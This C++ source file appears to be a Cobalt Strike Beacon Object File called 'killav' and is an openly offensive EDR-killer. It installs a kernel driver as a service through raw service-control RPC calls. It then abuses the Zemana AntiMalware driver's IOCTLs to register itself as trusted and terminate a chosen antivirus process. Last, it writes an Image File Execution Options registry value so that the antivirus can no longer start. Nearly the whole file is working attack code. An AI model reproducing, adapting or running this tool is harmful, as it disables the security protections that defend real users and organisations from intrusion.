#include <Windows.h>
#include <process.h>
#include <tlhelp32.h>
#include "base\helpers.h"

/**
 * For the debug build we want:
 *   a) Include the mock-up layer
 *   b) Undefine DECLSPEC_IMPORT since the mocked Beacon API
 *      is linked against the the debug build.
 */
#ifdef _DEBUG
#include "base\mock.h"
#undef DECLSPEC_IMPORT
#define DECLSPEC_IMPORT
#endif

#define AVPROCNAME L""
#define SVCNAME L"killav"
#define DriverPath L"C:\\Windows\\Temp\\killav.sys"

#define IOCTL_REGISTER_PROCESS 0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

extern "C" {
#include "beacon.h"
#include "svcctl_h.h"
#include "svcctl_c.c"
    // Define the Dynamic Function Resolution declaration for the GetLastError function
	DFR(RPCRT4, NdrClientCall2);
	DFR(RPCRT4, RpcBindingFree);
	DFR(KERNEL32, CloseHandle);
	DFR(KERNEL32, GetLastError);
	DFR(MSVCRT, malloc);
	DFR(MSVCRT, free);
	DFR(MSVCRT, wcscpy);
	DFR(MSVCRT, wcscmp);
	DFR(MSVCRT, _beginthreadex);
	DFR(MSVCRT, _endthreadex);
    // Map GetLastError to KERNEL32$GetLastError 
	#define NdrClientCall2 RPCRT4$NdrClientCall2
	#define RpcBindingFree RPCRT4$RpcBindingFree
	#define CloseHandle KERNEL32$CloseHandle
	#define GetLastError KERNEL32$GetLastError
	#define malloc MSVCRT$malloc
	#define free MSVCRT$free
	#define wcscpy MSVCRT$wcscpy
	#define wcscmp MSVCRT$wcscmp
	#define _beginthreadex MSVCRT$_beginthreadex
	#define _endthreadex MSVCRT$_endthreadex


	void __RPC_FAR* __RPC_USER midl_user_allocate(size_t len);

	void __RPC_USER midl_user_free(void __RPC_FAR* ptr);

	void __RPC_FAR* __RPC_USER midl_user_allocate(size_t len)
	{
		return malloc(len);
	}

	void __RPC_USER midl_user_free(void __RPC_FAR* ptr)
	{
		free(ptr);
	}

	handle_t __RPC_USER
		SVCCTL_HANDLEA_bind(SVCCTL_HANDLEA szMachineName)
	{
		return szMachineName;
	}

	void __RPC_USER
		SVCCTL_HANDLEA_unbind(SVCCTL_HANDLEA szMachineName, handle_t hBinding)
	{
		RPC_STATUS status;

		status = RpcBindingFree(&hBinding);
		if (status != RPC_S_OK)
		{
			BeaconPrintf(CALLBACK_ERROR, "RpcBindingFree returned 0x%x", status);
		}
	}

	handle_t __RPC_USER
		SVCCTL_HANDLEW_bind(SVCCTL_HANDLEW szMachineName)
	{
		DFR_LOCAL(RPCRT4, RpcStringBindingComposeW);
		DFR_LOCAL(RPCRT4, RpcBindingFromStringBindingW);
		DFR_LOCAL(RPCRT4, RpcStringFreeW);

		handle_t hBinding = NULL;
		RPC_WSTR pszStringBinding;
		RPC_STATUS status;

		status = RpcStringBindingComposeW(
			NULL,
			(RPC_WSTR)L"ncacn_np",
			(RPC_WSTR)szMachineName,
			(RPC_WSTR)L"\\pipe\\ntsvcs",
			NULL,
			&pszStringBinding);

		if (status != RPC_S_OK)
		{
			BeaconPrintf(CALLBACK_ERROR, "RpcStringBindingCompose returned 0x%x", status);
			return NULL;
		}

		/* Set the binding handle that will be used to bind to the server. */
		status = RpcBindingFromStringBindingW(pszStringBinding,
			&hBinding);
		if (status != RPC_S_OK)
		{
			BeaconPrintf(CALLBACK_ERROR, "RpcBindingFromStringBinding returned 0x%x", status);
		}

		status = RpcStringFreeW(&pszStringBinding);
		if (status != RPC_S_OK)
		{
			BeaconPrintf(CALLBACK_ERROR, "RpcStringFree returned 0x%x", status);
		}

		return hBinding;
	}

	void __RPC_USER
		SVCCTL_HANDLEW_unbind(SVCCTL_HANDLEW szMachineName, handle_t hBinding)
	{
		RPC_STATUS status;

		status = RpcBindingFree(&hBinding);
		if (status != RPC_S_OK)
		{
			BeaconPrintf(CALLBACK_ERROR, "RpcBindingFree returned 0x%x", status);
		}
	}

	DWORD RCloseServiceHandle(
		/* [out][in] */ LPSC_RPC_HANDLE hSCObject)
	{

		CLIENT_CALL_RETURN _RetVal;
		RPC_BINDING_HANDLE svcctl__MIDL_AutoBindHandle;

		const RPC_CLIENT_INTERFACE svcctl___RpcClientInterface =
			{
			sizeof(RPC_CLIENT_INTERFACE),
			{{0x367ABB81,0x9844,0x35F1,{0xAD,0x32,0x98,0xF0,0x38,0x00,0x10,0x03}},{2,0}},
			{{0x8A885D04,0x1CEB,0x11C9,{0x9F,0xE8,0x08,0x00,0x2B,0x10,0x48,0x60}},{2,0}},
			0,
			0,
			0,
			0,
			0,
			0x00000000
			};

		const GENERIC_BINDING_ROUTINE_PAIR BindingRoutines[GENERIC_BINDING_TABLE_SIZE] =
			{
			{
				(GENERIC_BINDING_ROUTINE)XFG_TRAMPOLINE_FPTR(SVCCTL_HANDLEW_bind),
				(GENERIC_UNBIND_ROUTINE)XFG_TRAMPOLINE_FPTR(SVCCTL_HANDLEW_unbind)
			 }
			,{
				(GENERIC_BINDING_ROUTINE)XFG_TRAMPOLINE_FPTR(SVCCTL_HANDLEA_bind),
				(GENERIC_UNBIND_ROUTINE)XFG_TRAMPOLINE_FPTR(SVCCTL_HANDLEA_unbind)
			 }

			};

		const MIDL_STUB_DESC svcctl_StubDesc =
			{
			(void*)&svcctl___RpcClientInterface,
			MIDL_user_allocate,
			MIDL_user_free,
			&svcctl__MIDL_AutoBindHandle,
			0,
			BindingRoutines,
			0,
			0,
			svcctl__MIDL_TypeFormatString.Format,
			1, /* -error bounds_check flag */
			0x60001, /* Ndr library version */
			0,
			0x8010272, /* MIDL Version 8.1.626 */
			0,
			0,
			0,  /* notify & notify_flag routine table */
			0x1, /* MIDL flag */
			0, /* cs routines */
			0,   /* proxy/server info */
			&svcctl_ExprDesc
			};

		_RetVal = NdrClientCall2(
			(PMIDL_STUB_DESC)&svcctl_StubDesc,
			(PFORMAT_STRING)&svcctl__MIDL_ProcFormatString.Format[0],
			hSCObject);
		return (DWORD)_RetVal.Simple;

	}

	DWORD RQueryServiceStatus(
		/* [in] */ SC_RPC_HANDLE hService,
		/* [out] */ LPSERVICE_STATUS lpServiceStatus)
	{

		CLIENT_CALL_RETURN _RetVal;
		RPC_BINDING_HANDLE svcctl__MIDL_AutoBindHandle;

		const RPC_CLIENT_INTERFACE svcctl___RpcClientInterface =
			{
			sizeof(RPC_CLIENT_INTERFACE),
			{{0x367ABB81,0x9844,0x35F1,{0xAD,0x32,0x98,0xF0,0x38,0x00,0x10,0x03}},{2,0}},
			{{0x8A885D04,0x1CEB,0x11C9,{0x9F,0xE8,0x08,0x00,0x2B,0x10,0x48,0x60}},{2,0}},
			0,
			0,
			0,
			0,
			0,
			0x00000000
			};

		const GENERIC_BINDING_ROUTINE_PAIR BindingRoutines[GENERIC_BINDING_TABLE_SIZE] =
			{
			{
				(GENERIC_BINDING_ROUTINE)XFG_TRAMPOLINE_FPTR(SVCCTL_HANDLEW_bind),
				(GENERIC_UNBIND_ROUTINE)XFG_TRAMPOLINE_FPTR(SVCCTL_HANDLEW_unbind)
			 }
			,{
				(GENERIC_BINDING_ROUTINE)XFG_TRAMPOLINE_FPTR(SVCCTL_HANDLEA_bind),
				(GENERIC_UNBIND_ROUTINE)XFG_TRAMPOLINE_FPTR(SVCCTL_HANDLEA_unbind)
			 }

			};

		const MIDL_STUB_DESC svcctl_StubDesc =
			{
			(void*)&svcctl___RpcClientInterface,
			MIDL_user_allocate,
			MIDL_user_free,
			&svcctl__MIDL_AutoBindHandle,
			0,
			BindingRoutines,
			0,
			0,
			svcctl__MIDL_TypeFormatString.Format,
			1, /* -error bounds_check flag */
			0x60001, /* Ndr library version */
			0,
			0x8010272, /* MIDL Version 8.1.626 */
			0,
			0,
			0,  /* notify & notify_flag routine table */
			0x1, /* MIDL flag */
			0, /* cs routines */
			0,   /* proxy/server info */
			&svcctl_ExprDesc
			};

		_RetVal = NdrClientCall2(
			(PMIDL_STUB_DESC)&svcctl_StubDesc,
			(PFORMAT_STRING)&svcctl__MIDL_ProcFormatString.Format[324],
			hService,
			lpServiceStatus);
		return (DWORD)_RetVal.Simple;

	}

	DWORD RCreateServiceW(
		/* [in] */ SC_RPC_HANDLE hSCManager,
		/* [range][string][in] */ wchar_t* lpServiceName,
		/* [range][unique][string][in] */ wchar_t* lpDisplayName,
		/* [in] */ DWORD dwDesiredAccess,
		/* [in] */ DWORD dwServiceType,
		/* [in] */ DWORD dwStartType,
		/* [in] */ DWORD dwErrorControl,
		/* [range][string][in] */ wchar_t* lpBinaryPathName,
		/* [range][unique][string][in] */ wchar_t* lpLoadOrderGroup,
		/* [unique][out][in] */ LPDWORD lpdwTagId,
		/* [size_is][unique][in] */ LPBYTE lpDependencies,
		/* [range][in] */ DWORD dwDependSize,
		/* [range][unique][string][in] */ wchar_t* lpServiceStartName,
		/* [size_is][unique][in] */ LPBYTE lpPassword,
		/* [range][in] */ DWORD dwPwSize,
		/* [out] */ LPSC_RPC_HANDLE lpServiceHandle)
	{

		CLIENT_CALL_RETURN _RetVal;
		RPC_BINDING_HANDLE svcctl__MIDL_AutoBindHandle;

		const RPC_CLIENT_INTERFACE svcctl___RpcClientInterface =
			{
			sizeof(RPC_CLIENT_INTERFACE),
			{{0x367ABB81,0x9844,0x35F1,{0xAD,0x32,0x98,0xF0,0x38,0x00,0x10,0x03}},{2,0}},
			{{0x8A885D04,0x1CEB,0x11C9,{0x9F,0xE8,0x08,0x00,0x2B,0x10,0x48,0x60}},{2,0}},
			0,
			0,
			0,
			0,
			0,
			0x00000000
			};

		const GENERIC_BINDING_ROUTINE_PAIR BindingRoutines[GENERIC_BINDING_TABLE_SIZE] =
			{
			{
				(GENERIC_BINDING_ROUTINE)XFG_TRAMPOLINE_FPTR(SVCCTL_HANDLEW_bind),
				(GENERIC_UNBIND_ROUTINE)XFG_TRAMPOLINE_FPTR(SVCCTL_HANDLEW_unbind)
			 }
			,{
				(GENERIC_BINDING_ROUTINE)XFG_TRAMPOLINE_FPTR(SVCCTL_HANDLEA_bind),
				(GENERIC_UNBIND_ROUTINE)XFG_TRAMPOLINE_FPTR(SVCCTL_HANDLEA_unbind)
			 }

			};

		const MIDL_STUB_DESC svcctl_StubDesc =
			{
			(void*)&svcctl___RpcClientInterface,
			MIDL_user_allocate,
			MIDL_user_free,
			&svcctl__MIDL_AutoBindHandle,
			0,
			BindingRoutines,
			0,
			0,
			svcctl__MIDL_TypeFormatString.Format,
			1, /* -error bounds_check flag */
			0x60001, /* Ndr library version */
			0,
			0x8010272, /* MIDL Version 8.1.626 */
			0,
			0,
			0,  /* notify & notify_flag routine table */
			0x1, /* MIDL flag */
			0, /* cs routines */
			0,   /* proxy/server info */
			&svcctl_ExprDesc
			};

		_RetVal = NdrClientCall2(
			(PMIDL_STUB_DESC)&svcctl_StubDesc,
			(PFORMAT_STRING)&svcctl__MIDL_ProcFormatString.Format[664],
			hSCManager,
			lpServiceName,
			lpDisplayName,
			dwDesiredAccess,
			dwServiceType,
			dwStartType,
			dwErrorControl,
			lpBinaryPathName,
			lpLoadOrderGroup,
			lpdwTagId,
			lpDependencies,
			dwDependSize,
			lpServiceStartName,
			lpPassword,
			dwPwSize,
			lpServiceHandle);
		return (DWORD)_RetVal.Simple;

	}

	DWORD ROpenSCManagerW(
		/* [range][unique][string][in] */ SVCCTL_HANDLEW lpMachineName,
		/* [range][unique][string][in] */ wchar_t* lpDatabaseName,
		/* [in] */ DWORD dwDesiredAccess,
		/* [out] */ LPSC_RPC_HANDLE lpScHandle)
	{

		CLIENT_CALL_RETURN _RetVal;
		RPC_BINDING_HANDLE svcctl__MIDL_AutoBindHandle;

		const RPC_CLIENT_INTERFACE svcctl___RpcClientInterface =
			{
			sizeof(RPC_CLIENT_INTERFACE),
			{{0x367ABB81,0x9844,0x35F1,{0xAD,0x32,0x98,0xF0,0x38,0x00,0x10,0x03}},{2,0}},
			{{0x8A885D04,0x1CEB,0x11C9,{0x9F,0xE8,0x08,0x00,0x2B,0x10,0x48,0x60}},{2,0}},
			0,
			0,
			0,
			0,
			0,
			0x00000000
			};

		const GENERIC_BINDING_ROUTINE_PAIR BindingRoutines[GENERIC_BINDING_TABLE_SIZE] =
			{
			{
				(GENERIC_BINDING_ROUTINE)XFG_TRAMPOLINE_FPTR(SVCCTL_HANDLEW_bind),
				(GENERIC_UNBIND_ROUTINE)XFG_TRAMPOLINE_FPTR(SVCCTL_HANDLEW_unbind)
			 }
			,{
				(GENERIC_BINDING_ROUTINE)XFG_TRAMPOLINE_FPTR(SVCCTL_HANDLEA_bind),
				(GENERIC_UNBIND_ROUTINE)XFG_TRAMPOLINE_FPTR(SVCCTL_HANDLEA_unbind)
			 }

			};

		const MIDL_STUB_DESC svcctl_StubDesc =
			{
			(void*)&svcctl___RpcClientInterface,
			MIDL_user_allocate,
			MIDL_user_free,
			&svcctl__MIDL_AutoBindHandle,
			0,
			BindingRoutines,
			0,
			0,
			svcctl__MIDL_TypeFormatString.Format,
			1, /* -error bounds_check flag */
			0x60001, /* Ndr library version */
			0,
			0x8010272, /* MIDL Version 8.1.626 */
			0,
			0,
			0,  /* notify & notify_flag routine table */
			0x1, /* MIDL flag */
			0, /* cs routines */
			0,   /* proxy/server info */
			&svcctl_ExprDesc
			};

		_RetVal = NdrClientCall2(
			(PMIDL_STUB_DESC)&svcctl_StubDesc,
			(PFORMAT_STRING)&svcctl__MIDL_ProcFormatString.Format[958],
			lpMachineName,
			lpDatabaseName,
			dwDesiredAccess,
			lpScHandle);
		return (DWORD)_RetVal.Simple;

	}

	DWORD ROpenServiceW(
		/* [in] */ SC_RPC_HANDLE hSCManager,
		/* [range][string][in] */ wchar_t* lpServiceName,
		/* [in] */ DWORD dwDesiredAccess,
		/* [out] */ LPSC_RPC_HANDLE lpServiceHandle)
	{

		CLIENT_CALL_RETURN _RetVal;
		RPC_BINDING_HANDLE svcctl__MIDL_AutoBindHandle;

		const RPC_CLIENT_INTERFACE svcctl___RpcClientInterface =
			{
			sizeof(RPC_CLIENT_INTERFACE),
			{{0x367ABB81,0x9844,0x35F1,{0xAD,0x32,0x98,0xF0,0x38,0x00,0x10,0x03}},{2,0}},
			{{0x8A885D04,0x1CEB,0x11C9,{0x9F,0xE8,0x08,0x00,0x2B,0x10,0x48,0x60}},{2,0}},
			0,
			0,
			0,
			0,
			0,
			0x00000000
			};

		const GENERIC_BINDING_ROUTINE_PAIR BindingRoutines[GENERIC_BINDING_TABLE_SIZE] =
			{
			{
				(GENERIC_BINDING_ROUTINE)XFG_TRAMPOLINE_FPTR(SVCCTL_HANDLEW_bind),
				(GENERIC_UNBIND_ROUTINE)XFG_TRAMPOLINE_FPTR(SVCCTL_HANDLEW_unbind)
			 }
			,{
				(GENERIC_BINDING_ROUTINE)XFG_TRAMPOLINE_FPTR(SVCCTL_HANDLEA_bind),
				(GENERIC_UNBIND_ROUTINE)XFG_TRAMPOLINE_FPTR(SVCCTL_HANDLEA_unbind)
			 }

			};

		const MIDL_STUB_DESC svcctl_StubDesc =
			{
			(void*)&svcctl___RpcClientInterface,
			MIDL_user_allocate,
			MIDL_user_free,
			&svcctl__MIDL_AutoBindHandle,
			0,
			BindingRoutines,
			0,
			0,
			svcctl__MIDL_TypeFormatString.Format,
			1, /* -error bounds_check flag */
			0x60001, /* Ndr library version */
			0,
			0x8010272, /* MIDL Version 8.1.626 */
			0,
			0,
			0,  /* notify & notify_flag routine table */
			0x1, /* MIDL flag */
			0, /* cs routines */
			0,   /* proxy/server info */
			&svcctl_ExprDesc
			};

		_RetVal = NdrClientCall2(
			(PMIDL_STUB_DESC)&svcctl_StubDesc,
			(PFORMAT_STRING)&svcctl__MIDL_ProcFormatString.Format[1020],
			hSCManager,
			lpServiceName,
			dwDesiredAccess,
			lpServiceHandle);
		return (DWORD)_RetVal.Simple;

	}

	DWORD RStartServiceW(
		/* [in] */ SC_RPC_HANDLE hService,
		/* [range][in] */ DWORD argc,
		/* [size_is][unique][in] */ LPSTRING_PTRSW argv)
	{

		CLIENT_CALL_RETURN _RetVal;
		RPC_BINDING_HANDLE svcctl__MIDL_AutoBindHandle;

		const RPC_CLIENT_INTERFACE svcctl___RpcClientInterface =
			{
			sizeof(RPC_CLIENT_INTERFACE),
			{{0x367ABB81,0x9844,0x35F1,{0xAD,0x32,0x98,0xF0,0x38,0x00,0x10,0x03}},{2,0}},
			{{0x8A885D04,0x1CEB,0x11C9,{0x9F,0xE8,0x08,0x00,0x2B,0x10,0x48,0x60}},{2,0}},
			0,
			0,
			0,
			0,
			0,
			0x00000000
			};

		const GENERIC_BINDING_ROUTINE_PAIR BindingRoutines[GENERIC_BINDING_TABLE_SIZE] =
			{
			{
				(GENERIC_BINDING_ROUTINE)XFG_TRAMPOLINE_FPTR(SVCCTL_HANDLEW_bind),
				(GENERIC_UNBIND_ROUTINE)XFG_TRAMPOLINE_FPTR(SVCCTL_HANDLEW_unbind)
			 }
			,{
				(GENERIC_BINDING_ROUTINE)XFG_TRAMPOLINE_FPTR(SVCCTL_HANDLEA_bind),
				(GENERIC_UNBIND_ROUTINE)XFG_TRAMPOLINE_FPTR(SVCCTL_HANDLEA_unbind)
			 }

			};

		const MIDL_STUB_DESC svcctl_StubDesc =
			{
			(void*)&svcctl___RpcClientInterface,
			MIDL_user_allocate,
			MIDL_user_free,
			&svcctl__MIDL_AutoBindHandle,
			0,
			BindingRoutines,
			0,
			0,
			svcctl__MIDL_TypeFormatString.Format,
			1, /* -error bounds_check flag */
			0x60001, /* Ndr library version */
			0,
			0x8010272, /* MIDL Version 8.1.626 */
			0,
			0,
			0,  /* notify & notify_flag routine table */
			0x1, /* MIDL flag */
			0, /* cs routines */
			0,   /* proxy/server info */
			&svcctl_ExprDesc
			};

		_RetVal = NdrClientCall2(
			(PMIDL_STUB_DESC)&svcctl_StubDesc,
			(PFORMAT_STRING)&svcctl__MIDL_ProcFormatString.Format[1206],
			hService,
			argc,
			argv);
		return (DWORD)_RetVal.Simple;
	}

	BOOL loadDriver()
	{
		RPC_STATUS status;
		SC_RPC_HANDLE schSCManager;
		SC_RPC_HANDLE schService;

		// Open a handle to the SCM database
		status = ROpenSCManagerW(
			(SVCCTL_HANDLEW)L"localhost",
			NULL,
			SC_MANAGER_ALL_ACCESS,
			&schSCManager
		);
		if (status != RPC_S_OK)
		{
			BeaconPrintf(CALLBACK_ERROR, "OpenSCManager failed. status: 0x%x", status);
			return 0;
		}

		// Check if the service already exists
		status = ROpenServiceW(
			(SC_RPC_HANDLE)schSCManager,
			(LPWSTR)SVCNAME,
			SERVICE_ALL_ACCESS,
			(SC_RPC_HANDLE*)&schService
		);
		if (schService != NULL)
		{
			BeaconPrintf(CALLBACK_OUTPUT, "Service already exists.");

			// Start the service if it"s not running
			SERVICE_STATUS serviceStatus;
			status = RQueryServiceStatus((SC_RPC_HANDLE)schService, &serviceStatus);
			if (status != RPC_S_OK)
			{
				BeaconPrintf(CALLBACK_ERROR, "QueryServiceStatus failed. status: 0x%x", status);
				RCloseServiceHandle(&schService);
				RCloseServiceHandle(&schSCManager);
				return 0;
			}

			if (serviceStatus.dwCurrentState == SERVICE_STOPPED)
			{
				status = RStartServiceW((SC_RPC_HANDLE)schService, 0, nullptr);
				if (status != RPC_S_OK)
				{
					BeaconPrintf(CALLBACK_ERROR, "StartService failed. status: 0x%x", status);
					RCloseServiceHandle(&schService);
					RCloseServiceHandle(&schSCManager);
					return 0;
				}

				BeaconPrintf(CALLBACK_OUTPUT, "Starting service...");
			}

			RCloseServiceHandle(&schService);
			RCloseServiceHandle(&schSCManager);

			return 1;
		}

		// Create the service
		status = RCreateServiceW(
			schSCManager,
			SVCNAME,
			SVCNAME,
			SERVICE_ALL_ACCESS,
			SERVICE_KERNEL_DRIVER,
			SERVICE_DEMAND_START,
			SERVICE_ERROR_IGNORE,
			DriverPath,
			NULL,
			NULL,
			NULL,
			0,
			NULL,
			NULL,
			0,
			&schService
		);
		if (status != RPC_S_OK)
		{
			BeaconPrintf(CALLBACK_ERROR, "CreateService failed. status: 0x%x", status);
			RCloseServiceHandle(&schSCManager);
			return 0;
		}

		BeaconPrintf(CALLBACK_OUTPUT, "Service created successfully.");

		// Start the service
		status = RStartServiceW((SC_RPC_HANDLE)schService, 0, nullptr);
		if (status != RPC_S_OK)
		{
			BeaconPrintf(CALLBACK_ERROR, "StartService failed. status: 0x%x", status);
			RCloseServiceHandle(&schService);
			RCloseServiceHandle(&schSCManager);
			return 0;
		}

		BeaconPrintf(CALLBACK_OUTPUT, "Starting service...");

		RCloseServiceHandle(&schService);
		RCloseServiceHandle(&schSCManager);

		return 1;
	}

	BOOL terminate(wchar_t* avproc)
	{
		DFR_LOCAL(KERNEL32, CreateToolhelp32Snapshot);
		DFR_LOCAL(KERNEL32, Process32FirstW);
		DFR_LOCAL(KERNEL32, Process32NextW);
		DFR_LOCAL(KERNEL32, CreateFileW);
		DFR_LOCAL(KERNEL32, GetCurrentProcessId);
		DFR_LOCAL(KERNEL32, DeviceIoControl);

		HANDLE hDevice;
		HANDLE hSnap;
		DWORD procId = 0;
		DWORD pOutbuff = 0;
		DWORD bytesRet = 0;

		hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

		if (hSnap != INVALID_HANDLE_VALUE) {
			PROCESSENTRY32W pE;
			pE.dwSize = sizeof(pE);

			if (Process32FirstW(hSnap, &pE)) {
				do {
					if (wcscmp(pE.szExeFile, avproc) == 0)
					{
						procId = pE.th32ProcessID;
						break;
					}
				} while (Process32NextW(hSnap, &pE));
			}
			CloseHandle(hSnap);
		}

		hDevice = CreateFileW(L"\\\\.\\ZemanaAntiMalware", 
				GENERIC_WRITE | GENERIC_READ, 
				0,
				NULL, 
				OPEN_EXISTING, 
				FILE_ATTRIBUTE_NORMAL, 
				NULL
			);

		if (hDevice == INVALID_HANDLE_VALUE) 
		{
			BeaconPrintf(CALLBACK_ERROR, "Failed to open handle to driver: 0x%x", GetLastError());
			return 0;
		}

		unsigned int input = GetCurrentProcessId();

		if (!DeviceIoControl(hDevice, 
			IOCTL_REGISTER_PROCESS, 
			&input, 
			sizeof(input),
			NULL, 
			0, 
			NULL, 
			NULL)) 
		{
			BeaconPrintf(CALLBACK_ERROR, "Failed to register the process in the trusted list %X !!", 
				IOCTL_REGISTER_PROCESS);
			CloseHandle(hDevice);
			return 0;
		}

		BeaconPrintf(CALLBACK_OUTPUT, "process registed in the trusted list %X !!",
			IOCTL_REGISTER_PROCESS);
		
		if (!DeviceIoControl(hDevice,
			IOCTL_TERMINATE_PROCESS,
			&procId,
			sizeof(procId),
			&pOutbuff,
			sizeof(pOutbuff),
			&bytesRet,
			NULL))
		{
			BeaconPrintf(CALLBACK_ERROR, "Faild to terminate !!");
			return 0;
		}
		else
			BeaconPrintf(CALLBACK_OUTPUT, "Terminated !!");

		CloseHandle(hDevice);

		return 1;
	}

	BOOL dosBlock(wchar_t* avproc)
	{
		DFR_LOCAL(ADVAPI32, RegOpenKeyExW);
		DFR_LOCAL(ADVAPI32, RegCreateKeyW);
		DFR_LOCAL(ADVAPI32, RegSetValueExW);
		DFR_LOCAL(ADVAPI32, RegCloseKey);

		NTSTATUS status;
		HKEY hKey;
		HKEY hSubkey;

		status = RegOpenKeyExW(HKEY_LOCAL_MACHINE,
			L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\",
			0,
			KEY_ALL_ACCESS,
			&hKey
		);

		if (status != ERROR_SUCCESS)
		{
			BeaconPrintf(CALLBACK_ERROR, "Failed to open registry key: 0x%x", status);
			return 0;
		}

		status = RegCreateKeyW(hKey, avproc, &hSubkey);

		if (status != ERROR_SUCCESS)
		{
			BeaconPrintf(CALLBACK_ERROR, "Failed to create registry key: 0x%x", status);
			RegCloseKey(hKey);
			return 0;
		}

		DWORD data = 0xFFFFFFFF;

		status = RegSetValueExW(hSubkey,
			L"MinimumStackCommitInBytes",
			0,
			REG_DWORD,
			(const BYTE*)&data,
			sizeof(data)
		);

		if (status != ERROR_SUCCESS)
		{
			BeaconPrintf(CALLBACK_ERROR, "Failed to set registry value: 0x%x", status);
			RegCloseKey(hSubkey);
			RegCloseKey(hKey);
			return 0;
		}

		BeaconPrintf(CALLBACK_OUTPUT, "Set block registry successfully.");

		RegCloseKey(hSubkey);
		RegCloseKey(hKey);

		return 1;
	}

	typedef struct Params {
		wchar_t avproc[128];
	} Params;

	void killAv(wchar_t* avproc)
	{
		DFR_LOCAL(KERNEL32, Sleep);

		if (loadDriver())
		{
			Sleep(2000);

			if (terminate(avproc))
			{
				if (dosBlock(avproc))
				{
					BeaconPrintf(CALLBACK_OUTPUT, "Done!");
				}
				else BeaconPrintf(CALLBACK_ERROR, "Block av failed!");
			}
			else BeaconPrintf(CALLBACK_ERROR, "Terminate av process failed!");
		}
		else BeaconPrintf(CALLBACK_ERROR, "Load driver failed!");
	}

	unsigned __stdcall BeginStub(void* p)
	{
		Params* params = (Params*)p;
		killAv(params->avproc);
		return 0;
	}

	LONG PvectoredExceptionHandler(EXCEPTION_POINTERS* ExceptionInfo)
	{
		_endthreadex(ExceptionInfo->ExceptionRecord->ExceptionCode);
		return EXCEPTION_CONTINUE_EXECUTION;
	}

    void go(char* args, int len) {
        /**
         * Define the Dynamic Function Resolution declaration for the GetSystemDirectoryA function
         * This time we use the DFR_LOCAL macro which create a local function pointer variable that
         * points to GetSystemDirectoryA. Therefore, we do have to map GetSystemDirectoryA to
         * KERNEL32$GetSystemDirectoryA
         */
		DFR_LOCAL(KERNEL32, AddVectoredExceptionHandler);
		DFR_LOCAL(KERNEL32, RemoveVectoredExceptionHandler);
		DFR_LOCAL(KERNEL32, WaitForSingleObject);
		DFR_LOCAL(KERNEL32, GetExitCodeThread);

		datap parser;
		DWORD exitcode = 0;
		HANDLE thread = NULL;
		PVOID handler = NULL;
		Params* params = NULL;

		//wchar_t* AvProc = NULL;

		//BeaconDataParse(&parser, args, len);
		//{
		//	AvProc = (wchar_t*)BeaconDataExtract(&parser, NULL);
		//}

		wchar_t* AvProc = AVPROCNAME;

		params = (Params*)malloc(sizeof(Params));

		wcscpy(params->avproc, AVPROCNAME);

		handler = AddVectoredExceptionHandler(0, (PVECTORED_EXCEPTION_HANDLER)PvectoredExceptionHandler);
		thread = (HANDLE)_beginthreadex(NULL, 0, BeginStub, params, 0, NULL);
		WaitForSingleObject(thread, INFINITE);
		GetExitCodeThread(thread, &exitcode);
		if (exitcode != 0)
		{
			BeaconPrintf(CALLBACK_ERROR, "An exception occured while running: 0x%x", exitcode);
		}
		if (thread) { CloseHandle(thread); }
		if (handler) { RemoveVectoredExceptionHandler(handler); }
		if (params) { free(params); }
    }
}

// Define a main function for the bebug build
#if defined(_DEBUG) && !defined(_GTEST)

#pragma comment(lib,"RpcRT4.lib")

int main(int argc, char* argv[]) {
    // Run BOF's entrypoint
    // To pack arguments for the bof use e.g.: bof::runMocked<int, short, const char*>(go, 6502, 42, "foobar");
    bof::runMocked<>(go);
    return 0;
}

// Define unit tests
#elif defined(_GTEST)
#include <gtest\gtest.h>

TEST(BofTest, Test1) {
    std::vector<bof::output::OutputEntry> got =
        bof::runMocked<>(go);
    std::vector<bof::output::OutputEntry> expected = {
        {CALLBACK_OUTPUT, "System Directory: C:\\Windows\\system32"}
    };
    // It is possible to compare the OutputEntry vectors, like directly
    // ASSERT_EQ(expected, got);
    // However, in this case, we want to compare the output, ignoring the case.
    ASSERT_EQ(expected.size(), got.size());
    ASSERT_STRCASEEQ(expected[0].output.c_str(), got[0].output.c_str());
}
#endif